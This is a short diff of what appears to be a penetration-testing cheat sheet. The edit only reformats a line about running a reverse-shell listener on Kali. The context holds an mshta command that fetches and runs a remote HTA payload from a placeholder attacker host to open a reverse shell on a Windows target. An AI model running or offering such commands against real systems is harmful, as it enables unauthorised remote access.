@@ -59,7 +59,7 @@ These are just some of the ways
             ```
         * [mini-reverse.ps1](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5) from @staaldraad
             * Modify to change IP Address and port of reverse shell listener
-    1. On your Kali, Run your reverse shell listener (msf exploit/multi/hanlder or nc)
+    1. On your Kali, Run your reverse shell listener (`msf exploit/multi/hanlder` or `#!bash nc`)
     1. On the target machine, execute:
         ```batch
         mshta http://<YOUR_KALI_IP_OR_FILEHOSTING_MACHINE>:8000/mini-reverse.hta
